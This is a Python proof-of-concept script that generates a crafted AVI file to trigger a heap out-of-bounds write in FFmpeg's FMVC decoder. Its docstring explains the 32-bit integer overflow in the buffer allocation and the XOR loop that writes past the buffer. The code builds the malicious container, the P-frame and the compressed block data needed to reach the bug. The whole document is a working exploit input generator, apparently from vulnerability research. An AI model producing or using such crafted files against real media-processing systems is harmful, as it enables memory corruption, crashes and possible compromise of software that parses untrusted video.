#!/usr/bin/env python3
"""
PoC generator for FMVC decoder heap OOB write (CWE-190 -> CWE-787)
Target: FFmpeg/libavcodec/fmvc.c

Vulnerability:
  decode_init() computes buffer_size = width * height * 4 using 32-bit
  signed arithmetic, overflowing for width=32768, height=32769, bpp=32:
    32768 * 32769 * 4 = 4295098368 which wraps to 131072 as int32.
  av_mallocz(131072) succeeds, allocating only 128KB.

  decode_frame() P-frame XOR loop processes block 0 (w=84, h=112):
    stride = 32768 DWORDs
    After row k=0 finishes: dst = column + stride = s->buffer + 32768*4 = +131072 bytes
    Row k=1: *dst++ ^= *src++  ->  OOB WRITE at exactly s->buffer + 131072
    (heap buffer is only 131072 bytes, so offset 131072 is one past the end)

Trigger path:
  avformat_open_input -> avi_read_packet -> avcodec_send_packet
  -> decode_frame [fmvc.c] -> XOR loop line 509

decode_type1 encoding strategy to produce exactly 37632 bytes:
  - 73 x [0x00, 0xF9, <512 zeros>]  = 37376 bytes output
  - [0x00, 0xE0, <256 zeros>]       =   256 bytes output
  - [0x20]                          = terminator (empty gb -> gbc pos == pb pos -> break)
  Total output: 73*512 + 256 = 37632 = 9408 * 4 = s->blocks[0].size * 4  (validation passes)
"""

import struct
import os
import sys

BLOCK_WIDTH  = 84
BLOCK_HEIGHT = 112

# --- AVI container helpers ---

def fourcc(s):
    return s.encode('ascii') if isinstance(s, str) else s

def avi_chunk(tag, data):
    data = bytes(data)
    result = fourcc(tag) + struct.pack('<I', len(data)) + data
    # AVI chunks are padded to even size; padding byte is NOT counted in size field
    if len(data) % 2 == 1:
        result += b'\x00'
    return result

def avi_list(tag, list_type, data):
    data = bytes(data)
    inner = fourcc(list_type) + data
    return fourcc(tag) + struct.pack('<I', len(inner)) + inner

def make_avih(width, height, total_frames=1, streams=1):
    """AVIMAINHEADER, 56 bytes."""
    return struct.pack('<14I',
        33333,        # dwMicroSecPerFrame
        0,            # dwMaxBytesPerSec
        0,            # dwPaddingGranularity
        0x10,         # dwFlags (AVIF_HASINDEX)
        total_frames, # dwTotalFrames
        0,            # dwInitialFrames
        streams,      # dwStreams
        0,            # dwSuggestedBufferSize
        width,        # dwWidth
        height,       # dwHeight
        0, 0, 0, 0,   # dwReserved[4]
    )

def make_strh(width, height, fps=30, total_frames=1):
    """AVISTREAMHEADER for video, 56 bytes."""
    return (
        b'vids' +  # fccType
        b'FMVC' +  # fccHandler
        struct.pack('<IHHIIIIIIII',
            0,            # dwFlags
            0,            # wPriority
            0,            # wLanguage
            0,            # dwInitialFrames
            1,            # dwScale
            fps,          # dwRate
            0,            # dwStart
            total_frames, # dwLength
            0,            # dwSuggestedBufferSize
            0xFFFFFFFF,   # dwQuality (-1)
            0,            # dwSampleSize
        ) +
        struct.pack('<HHHH', 0, 0, width & 0xFFFF, height & 0xFFFF)  # rcFrame
    )

def make_bitmapinfoheader(width, height, bit_count):
    """BITMAPINFOHEADER, 40 bytes. biCompression = 'FMVC'."""
    # 'FMVC' as little-endian DWORD: F=0x46 M=0x4D V=0x56 C=0x43 -> 0x43564D46
    return struct.pack('<IiiHHIIiiII',
        40,          # biSize
        width,       # biWidth  (int32)
        height,      # biHeight (int32, positive = bottom-up)
        1,           # biPlanes
        bit_count,   # biBitCount
        0x43564D46,  # biCompression 'FMVC'
        0,           # biSizeImage
        0,           # biXPelsPerMeter
        0,           # biYPelsPerMeter
        0,           # biClrUsed
        0,           # biClrImportant
    )

# --- decode_type1 compressed data ---

def make_type1_rle_512():
    """
    decode_type1 sequence that outputs 512 bytes of zeros.

    Innermost-loop path:
      opcode = 0x00  (< 0x20, == 0 -> read second byte)
      second = 0xF9  (>= 0xF8 -> run-length)
      i = 0xF9 - 0xF8 = 1
      len = 256; do { len *= 2; --i } while(i)  -> len = 512
      copy 512 bytes from input (8 bytes at a time) to output
    """
    return b'\x00\xF9' + b'\x00' * 512  # 514 bytes in, 512 bytes out

def make_type1_lit_256():
    """
    decode_type1 sequence that outputs 256 bytes of zeros (literal copy).

    Innermost-loop path:
      opcode = 0x00  (< 0x20, == 0 -> read second byte)
      second = 0xE0  (< 0xF8 -> opcode = 0xE0 + 32 = 256, break)
      !high -> literal copy 256 bytes from input
    """
    return b'\x00\xE0' + b'\x00' * 256  # 258 bytes in, 256 bytes out

def make_type1_terminator():
    """
    Terminator byte for decode_type1.

    After literal copy, back-ref-scan loop reads 0x20:
      opcode = 0x20  >= 0x20 -> break from back-ref loop
      high = 0; opcode < 0x40 -> break from L2
    Now in OUTER body with empty gb:
      opcode & 0x1F = 0 -> !len path -> reads 0, len = 31
      pos = -read_byte(empty) = 0
      gbc = tell_p(pb) + 0 - (0 << 8) = tell_p(pb)
      tell_p(pb) == tell(&gbc)  -> break from OUTER
    """
    return b'\x20'

def make_type1_compressed_37632():
    """
    Build a decode_type1 input that produces exactly 37632 bytes of output.

    37632 = 73 * 512 + 256
    Input:  73 * 514 + 258 + 1 = 37781 bytes
    Output: 73 * 512 + 256    = 37632 bytes
    """
    data = bytearray()
    for _ in range(73):
        data += make_type1_rle_512()   # 514 bytes each
    data += make_type1_lit_256()       # 258 bytes
    data += make_type1_terminator()    # 1 byte
    assert len(data) == 37781, f"Expected 37781, got {len(data)}"
    return bytes(data)

# --- FMVC P-frame packet ---

def make_pframe(compressed_data):
    """
    FMVC P-frame packet (non-keyframe).

    Format (from decode_frame):
      [2 bytes: skipped by decoder]
      [2 bytes LE: key_frame = 0]
      [2 bytes LE: nb_blocks = 1]
      [2 bytes LE: type = 1 (decode_type1)]
      -- block 0 --
      [2 bytes LE: offset = 0 (block index)]
      [2 bytes LE: size = len(compressed_data)]
      [size bytes: compressed data]

    Block 0 validation: s->blocks[0].size * 4 must equal bytes written to pbuffer.
    s->blocks[0].size = BLOCK_WIDTH * BLOCK_HEIGHT = 84 * 112 = 9408
    Required pbuffer bytes = 9408 * 4 = 37632  ->  our compressed data output size.
    """
    assert len(compressed_data) <= 0xFFFF, "compressed too large for LE16 size field"
    pkt = struct.pack('<HHHHHH',
        0,                    # 2 bytes skipped
        0,                    # key_frame = 0 (P-frame)
        1,                    # nb_blocks = 1
        1,                    # type = 1 (decode_type1)
        0,                    # block offset = 0
        len(compressed_data), # block compressed byte count
    )
    pkt += compressed_data
    return pkt

# --- Main ---

def main():
    width    = 32768
    height   = 32769  # intentionally large to trigger overflow
    bit_count = 32

    # Verify overflow analysis:
    # buffer_size = width * height * 4  (as C int32 arithmetic)
    import ctypes
    buf_size_c = ctypes.c_int(width * height * 4).value  # simulate int32 overflow
    buf_size_py = width * height * 4  # actual needed size
    print(f"[*] width={width}, height={height}, bpp={bit_count}")
    print(f"[*] Needed buffer: {buf_size_py} bytes ({buf_size_py//(1024*1024)} MB)")
    print(f"[*] Allocated (overflowed int32->size_t): {ctypes.c_uint(buf_size_c).value} bytes")
    print(f"[*] Buffer underallocation by: {buf_size_py - ctypes.c_uint(buf_size_c).value} bytes")

    # Block layout sanity check
    stride = (width * bit_count + 31) // 32   # = 32768 DWORDs
    xb = stride // BLOCK_WIDTH                # = 389
    m = stride % BLOCK_WIDTH                  # = 92
    if m >= 37:
        w = m
        xb += 1                               # xb = 390
    else:
        w = m + BLOCK_WIDTH
    yb = height // BLOCK_HEIGHT               # = 292
    m2 = height % BLOCK_HEIGHT               # = 65
    if m2 >= 49:
        h = m2
        yb += 1                               # yb = 293
    else:
        h = m2 + BLOCK_HEIGHT
    nb_blocks = xb * yb
    block0_size = BLOCK_WIDTH * BLOCK_HEIGHT  # 9408 (interior block, not corner/edge)
    block0_size_bytes = block0_size * 4       # 37632
    alloc_size = ctypes.c_uint(buf_size_c).value  # 131072

    print(f"[*] stride={stride}, xb={xb}, yb={yb}, nb_blocks={nb_blocks}")
    print(f"[*] block[0]: w={BLOCK_WIDTH}, h={BLOCK_HEIGHT}, size={block0_size}, size*4={block0_size_bytes}")
    print(f"[*] OOB at k=1: dst = buffer + {stride}*4 = buffer + {stride*4} bytes, buffer_size={alloc_size}")

    # Build compressed data
    compressed = make_type1_compressed_37632()
    print(f"[*] Compressed data: {len(compressed)} bytes -> {block0_size_bytes} bytes decompressed")

    # Build frame
    frame_data = make_pframe(compressed)
    print(f"[*] Frame packet: {len(frame_data)} bytes")

    # Build AVI
    avih_data = make_avih(width, height)
    assert len(avih_data) == 56
    avih_chunk = avi_chunk('avih', avih_data)

    strh_data = make_strh(width, height)
    assert len(strh_data) == 56
    strh_chunk = avi_chunk('strh', strh_data)

    strf_data = make_bitmapinfoheader(width, height, bit_count)
    assert len(strf_data) == 40
    strf_chunk = avi_chunk('strf', strf_data)

    strl_list = avi_list('LIST', 'strl', strh_chunk + strf_chunk)
    hdrl_list = avi_list('LIST', 'hdrl', avih_chunk + strl_list)

    frame_chunk = avi_chunk('00dc', frame_data)
    movi_list   = avi_list('LIST', 'movi', frame_chunk)

    riff_body = hdrl_list + movi_list
    riff = b'RIFF' + struct.pack('<I', len(riff_body) + 4) + b'AVI ' + riff_body

    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001_input.avi')
    with open(out_path, 'wb') as f:
        f.write(riff)
    print(f"[+] Written {len(riff)} bytes to {out_path}")

if __name__ == '__main__':
    main()
